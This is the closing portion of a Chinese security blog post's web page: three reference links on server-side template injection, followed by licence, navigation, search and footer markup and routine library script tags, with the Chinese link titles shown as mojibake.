<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹sstiæ¼æ´</a></p>
<p><a target="_blank" rel="noopener" href="http://www.bubuko.com/infodetail-3516225.html">ssti</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679#toc-4">flaskä¹‹sstiæ¨¡æ¿æ³¨å…¥</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/04/10/wei6/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">sprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/04/05/wei/">
                        <span class="hidden-mobile">SSTI(ä¸€)</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
